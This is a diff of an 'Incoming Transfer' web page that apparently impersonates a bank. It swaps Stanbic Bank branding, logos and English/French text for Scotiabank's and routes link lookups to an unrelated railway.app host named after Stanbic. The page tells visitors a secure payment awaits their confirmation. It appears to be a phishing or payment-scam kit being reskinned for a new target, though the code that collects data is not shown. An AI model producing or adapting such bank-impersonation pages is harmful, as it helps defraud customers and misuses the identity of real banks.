@@ -3,16 +3,16 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-<title>Stanbic Bank · Incoming Transfer</title>
+<title>Scotiabank · Incoming Transfer</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --sb-primary:   #01008C;
-    --sb-royal:     #005EB8;
-    --sb-navy:      #001E50;
-    --sb-gold:      #FFB81C;
+    --sb-primary:   #EC111A;
+    --sb-royal:     #C00D14;
+    --sb-navy:      #1A1A1A;
+    --sb-gold:      #FFFFFF;
     --sb-white:     #FFFFFF;
     --sb-text:      #1A2233;
     --sb-muted:     #5B6577;
@@ -50,12 +50,7 @@
     gap: 12px;
   }
   .brand-block { display: flex; align-items: center; gap: 10px; }
-  .header-logo { height: 38px; width: auto; display: block; flex-shrink: 0; }
-  .brand-text {
-    font-size: 21px; font-weight: 800; letter-spacing: -0.5px;
-    color: var(--sb-primary); line-height: 1; white-space: nowrap;
-  }
-  .brand-text .dot { color: var(--sb-gold); }
+  .header-logo { height: 26px; width: auto; display: block; flex-shrink: 0; }
 
   .header-actions { display: flex; gap: 8px; flex-shrink: 0; }
   .header-btn {
@@ -79,7 +74,7 @@
   }
   .hero::before {
     content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
-    background: var(--sb-gold);
+    background: #FFD400;
     border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
   .secure-badge {
@@ -90,7 +85,7 @@
     border: 1px solid rgba(255,255,255,0.25);
     padding: 5px 10px; border-radius: 999px;
   }
-  .secure-badge svg { width: 11px; height: 11px; stroke: var(--sb-gold); fill: none; stroke-width: 2.4; }
+  .secure-badge svg { width: 11px; height: 11px; stroke: #FFD400; fill: none; stroke-width: 2.4; }
   .hero-title {
     margin-top: 16px; font-size: 22px; font-weight: 800;
     color: #FFFFFF; letter-spacing: -0.4px; line-height: 1.25;
@@ -129,14 +124,14 @@
     font-family: inherit; font-size: 18px; font-weight: 800;
     letter-spacing: 0.3px; line-height: 1.2;
     border: none; border-radius: 14px; cursor: pointer;
-    box-shadow: 0 10px 26px rgba(1,0,140,0.32);
+    box-shadow: 0 10px 26px rgba(236,17,26,0.32);
     transition: filter .15s, transform .1s, box-shadow .15s;
     margin-bottom: 26px;
     display: flex; align-items: center; justify-content: center; gap: 12px;
     -webkit-tap-highlight-color: transparent;
     touch-action: manipulation;
   }
-  .btn-accept:hover { filter: brightness(1.10); box-shadow: 0 12px 30px rgba(1,0,140,0.40); }
+  .btn-accept:hover { filter: brightness(1.10); box-shadow: 0 12px 30px rgba(236,17,26,0.40); }
   .btn-accept:active { transform: scale(0.98); }
   .btn-accept:disabled { opacity: 0.65; cursor: wait; }
   .btn-accept svg { width: 24px; height: 24px; stroke: currentColor; fill: none; stroke-width: 2.6; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
@@ -189,7 +184,7 @@
     font-size: 13px; font-weight: 700; text-align: right;
     word-break: break-word; color: var(--sb-text);
   }
-  .detail-row.purpose-row .k { color: #8A6600; }
+  .detail-row.purpose-row .k { color: #A50D14; }
   .detail-row.purpose-row .v { color: var(--sb-navy); font-weight: 800; }
 
   .sb-footer {
@@ -201,18 +196,16 @@
     gap: 14px;
   }
   .footer-brand { display: flex; align-items: center; gap: 8px; }
-  .foot-logo { height: 30px; width: auto; display: block; flex-shrink: 0; }
-  .foot-brand-text {
-    font-size: 17px; font-weight: 800; letter-spacing: -0.4px;
-    color: #fff; line-height: 1; white-space: nowrap;
+  .foot-logo {
+    height: 22px; width: auto; display: block; flex-shrink: 0;
+    filter: brightness(0) invert(1);
   }
-  .foot-brand-text .dot { color: var(--sb-gold); }
   .sb-footer .foot-support {
     font-size: 11px; color: rgba(255,255,255,0.75); line-height: 1.5; font-weight: 500;
     text-align: right;
   }
   .sb-footer .foot-support strong {
-    color: var(--sb-gold); font-weight: 700; font-size: 12.5px;
+    color: #FFD400; font-weight: 700; font-size: 12.5px;
   }
 
   .toast {
@@ -271,8 +264,7 @@
 
   @media (max-width: 380px) {
     .header { padding-top: max(16px, env(safe-area-inset-top, 0px)); padding-bottom: 14px; }
-    .header-logo { height: 32px; }
-    .brand-text { font-size: 18px; }
+    .header-logo { height: 22px; }
     .header-btn { width: 36px; height: 36px; }
     .header-btn svg { width: 15px; height: 15px; }
     .hero { padding: 18px 18px 22px; }
@@ -290,15 +282,14 @@
     .detail-row .k { font-size: 11.5px; }
     .detail-row .v { font-size: 12.5px; }
     .sb-footer { padding: 16px 18px; flex-wrap: wrap; }
-    .foot-logo { height: 26px; }
-    .foot-brand-text { font-size: 15px; }
+    .foot-logo { height: 20px; }
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
     .phone {
       min-height: auto; max-height: 900px;
       border-radius: 20px;
-      box-shadow: 0 30px 80px rgba(1,0,140,0.14);
+      box-shadow: 0 30px 80px rgba(236,17,26,0.14);
       overflow-y: auto;
     }
   }
@@ -312,12 +303,11 @@
     <div class="brand-block">
       <img
         class="header-logo"
-        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-        alt="Stanbic Bank logo"
+        src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg"
+        alt="Scotiabank"
         referrerpolicy="no-referrer"
         onerror="this.style.display='none'"
       >
-      <span class="brand-text">Stanbic<span class="dot">.</span></span>
     </div>
     <div class="header-actions">
       <button class="header-btn" id="copyBtn" onclick="copyReceipt()" aria-label="Copy receipt">
@@ -371,12 +361,11 @@
       <div class="footer-brand">
         <img
           class="foot-logo"
-          src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-          alt="Stanbic Bank logo"
+          src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg"
+          alt="Scotiabank"
           referrerpolicy="no-referrer"
           onerror="this.style.display='none'"
         >
-        <span class="foot-brand-text">Stanbic<span class="dot">.</span></span>
       </div>
       <div class="foot-support">
         <span id="helpLabel">Customer Care</span><br>
@@ -390,9 +379,11 @@
 <div class="toast" id="toast"></div>
 
 <script>
+  const API_BASE = 'https://stanbicmobilepayment-production.up.railway.app';
+
   const I18N = {
     en: {
-      docTitle: 'Stanbic Bank · Incoming Transfer',
+      docTitle: 'Scotiabank · Incoming Transfer',
       heroTitle: 'Incoming Transfer',
       heroSub: 'A secure payment is being transferred to your account. Review the details below and confirm to proceed.',
       amountLabel: 'Transfer amount',
@@ -405,9 +396,9 @@
       needHelp: 'Customer Care',
       callLabel: 'Call',
       copyToast: 'Receipt copied to clipboard.',
-      copyReceiptTitle: 'Stanbic Bank — Incoming Transfer',
+      copyReceiptTitle: 'Scotiabank — Incoming Transfer',
       initiating: 'Preparing secure transfer…',
-      initiatingDesc: 'Connecting securely to Stanbic Bank so you can receive this payment. Please do not close this page.',
+      initiatingDesc: 'Connecting securely to Scotiabank so you can receive this payment. Please do not close this page.',
       initiatingNote: 'This usually takes a few seconds.',
       expiredTitle: 'Payment Request Expired',
       expiredDescPrefix: 'This payment link is no longer valid.',
@@ -422,10 +413,10 @@
       kTransactionDate: 'Date',
       kStatus: 'Status',
       vReceived: 'Ready to receive',
-      docTitleInvalid: 'Invalid Link · Stanbic Bank'
+      docTitleInvalid: 'Invalid Link · Scotiabank'
     },
     fr: {
-      docTitle: 'Stanbic Bank · Virement entrant',
+      docTitle: 'Scotiabank · Virement entrant',
       heroTitle: 'Virement entrant',
       heroSub: 'Un paiement sécurisé est en cours de transfert vers votre compte. Vérifiez les détails ci-dessous et confirmez pour continuer.',
       amountLabel: 'Montant du transfert',
@@ -438,9 +429,9 @@
       needHelp: 'Service Client',
       callLabel: 'Appelez le',
       copyToast: 'Reçu copié dans le presse-papiers.',
-      copyReceiptTitle: 'Stanbic Bank — Virement entrant',
+      copyReceiptTitle: 'Scotiabank — Virement entrant',
       initiating: 'Préparation du transfert sécurisé…',
-      initiatingDesc: 'Connexion sécurisée à Stanbic Bank pour recevoir ce paiement. Veuillez ne pas fermer cette page.',
+      initiatingDesc: 'Connexion sécurisée à Scotiabank pour recevoir ce paiement. Veuillez ne pas fermer cette page.',
       initiatingNote: 'Cela prend généralement quelques secondes.',
       expiredTitle: 'Demande de paiement expirée',
       expiredDescPrefix: 'Ce lien de paiement n\'est plus valide.',
@@ -455,7 +446,7 @@
       kTransactionDate: 'Date',
       kStatus: 'Statut',
       vReceived: 'Prêt à recevoir',
-      docTitleInvalid: 'Lien invalide · Stanbic Bank'
+      docTitleInvalid: 'Lien invalide · Scotiabank'
     }
   };
 
@@ -490,7 +481,7 @@
 
     if (code) {
       try {
-        const res = await fetch('/api/links/' + encodeURIComponent(code));
+        const res = await fetch(API_BASE + '/api/links/' + encodeURIComponent(code));
         if (res.status === 410) {
           const body = await res.json().catch(() => ({}));
           return { _expired: true, expiresAt: body.expiresAt || null };
@@ -542,7 +533,8 @@
     'Uganda (MTN)': '100',
     'Ghana': '100',
     'Ghana (MTN)': '100',
-    'Benin': '111'
+    'Benin': '111',
+    'Botswana': '399 9100'
   };
 
   function formatDate(ts) {
@@ -581,7 +573,7 @@
           '<div class="expired-icon">' +
             '<svg viewBox="0 0 24 24"><path d="M12 8v5M12 16.5v.01"/></svg>' +
           '</div>' +
-          '<div style="font-size:20px;font-weight:800;color:#001E50;margin-bottom:8px">' + T.expiredTitle + '</div>' +
+          '<div style="font-size:20px;font-weight:800;color:#1A1A1A;margin-bottom:8px">' + T.expiredTitle + '</div>' +
           '<div style="font-size:13.5px;color:#5B6577;line-height:1.6">' + T.expiredDescPrefix + ' ' + expText + '<br>' + T.expiredDescSuffix + '</div>' +
         '</div>';
       document.title = T.docTitle;
@@ -618,9 +610,8 @@
     const amtFull = formatAmount(tx.am, tx.cur);
     document.getElementById('amountValue').textContent = amtFull;
     document.getElementById('reqRecipient').textContent = tx.rn || '—';
-    document.getElementById('fromName').textContent = tx.mk || 'Stanbic Bank';
+    document.getElementById('fromName').textContent = tx.mk || 'Scotiabank';
 
-    /* ─── Transaction Details — RENDER ALL FIELDS, ALWAYS ─── */
     const rows = [
       { k: T.purposeLabel,     v: tx.pu || '—',              cls: 'purpose-row' },
       { k: T.kCountry,         v: tx.c || '—' },
@@ -646,7 +637,7 @@
       '----------------------------------',
       T.amountLabel + ': ' + formatAmount(tx.am, tx.cur),
       T.purposeLabel + ': ' + (tx.pu || '—'),
-      T.fromLabel + ': ' + (tx.mk || 'Stanbic Bank'),
+      T.fromLabel + ': ' + (tx.mk || 'Scotiabank'),
       T.toLabel + ': ' + (tx.rn || '—'),
       T.kCountry + ': ' + (tx.c || '—'),
       T.kReference + ': ' + (tx.ref || '—'),
